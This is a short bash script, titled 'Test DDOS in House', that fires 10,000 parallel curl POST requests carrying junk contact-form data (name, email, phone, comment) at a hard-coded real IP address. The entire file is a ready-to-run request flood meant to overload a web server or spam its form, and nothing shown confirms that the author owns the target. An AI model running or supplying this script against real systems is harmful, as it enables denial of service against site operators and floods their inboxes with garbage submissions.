#!/bin/bash


echo Test DDOS in House

for i in {1..10000}
do
   curl -X POST --data 'fullname=eeqweqweqw+qweqweqweqw&email=sdewqeqw%40qweqweq.com&phone=5555555555&comment=sadsadasdasdas+dasd+ad+as+d+qwe+qw+e+qw' 192.81.218.96 &
done
